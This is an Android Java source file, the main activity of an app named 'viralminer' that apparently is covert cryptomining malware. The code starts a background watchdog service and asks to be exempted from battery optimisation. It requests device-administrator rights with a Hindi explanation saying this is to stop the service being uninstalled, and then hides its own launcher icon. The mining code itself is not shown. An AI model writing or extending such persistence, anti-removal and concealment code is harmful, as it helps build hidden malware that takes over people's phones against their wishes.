package com.viralminer;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;

public class MainActivity extends Activity {

    private static final int REQ_NOTIF = 11;
    private static final int REQ_BATT  = 12;
    private static final int REQ_ADMIN = 13;

    private int step = 0;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);

        Watchdog.ensureRunning(this, true);
        Watchdog.schedule(this);

        SharedPreferences p = getSharedPreferences("viral", MODE_PRIVATE);
        if (p.getBoolean("onboard_done", false)) {
            hideIconIfNeeded();
            finish();
        } else {
            nextStep();
        }
    }

    private void nextStep() {
        SharedPreferences p = getSharedPreferences("viral", MODE_PRIVATE);
        try {
            switch (step++) {
                case 0:
                    if (Build.VERSION.SDK_INT >= 33
                            && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS)
                               != PackageManager.PERMISSION_GRANTED) {
                        requestPermissions(new String[]{ Manifest.permission.POST_NOTIFICATIONS }, REQ_NOTIF);
                    } else nextStep();
                    break;

                case 1:
                    if (!p.getBoolean("batt_asked", false)) {
                        p.edit().putBoolean("batt_asked", true).apply();
                        Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                        i.setData(Uri.parse("package:" + getPackageName()));
                        startActivityForResult(i, REQ_BATT);
                    } else nextStep();
                    break;

                case 2:
                    if (!p.getBoolean("admin_asked", false)) {
                        p.edit().putBoolean("admin_asked", true).apply();
                        DevicePolicyManager dpm =
                                (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                        ComponentName cn = new ComponentName(this, AdminReceiver.class);
                        if (dpm != null && !dpm.isAdminActive(cn)) {
                            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
                            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                    "Background service ko uninstall se bachane ke liye.");
                            startActivityForResult(i, REQ_ADMIN);
                        } else nextStep();
                    } else nextStep();
                    break;

                default:
                    p.edit().putBoolean("onboard_done", true).apply();
                    hideIconIfNeeded();
                    finish();
            }
        } catch (Throwable t) {
            p.edit().putBoolean("onboard_done", true).apply();
            hideIconIfNeeded();
            finish();
        }
    }

    private void hideIconIfNeeded() {
        if (!Config.HIDE_ICON) return;
        try {
            getPackageManager().setComponentEnabledSetting(
                    new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        } catch (Throwable ignored) { }
    }

    @Override public void onRequestPermissionsResult(int rc, String[] perms, int[] res) {
        nextStep();
    }

    @Override protected void onActivityResult(int rc, int result, Intent data) {
        super.onActivityResult(rc, result, data);
        nextStep();
    }
}
